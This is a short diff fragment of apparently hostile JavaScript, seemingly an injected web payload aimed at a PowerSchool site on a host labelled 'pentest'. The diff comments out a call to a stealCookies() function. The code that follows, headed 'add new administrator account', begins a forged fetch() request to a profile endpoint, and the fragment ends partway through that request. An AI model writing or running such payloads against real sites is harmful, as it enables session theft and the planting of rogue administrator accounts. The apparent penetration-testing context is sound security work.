@@ -16,7 +16,7 @@ function getCookie(cname)
   }
   return "";
 }
-stealCookies();
+//stealCookies();
 
 // add new administrator account
 fetch("https://pentest.sfe.powerschool.com/profileMainAction.do", {
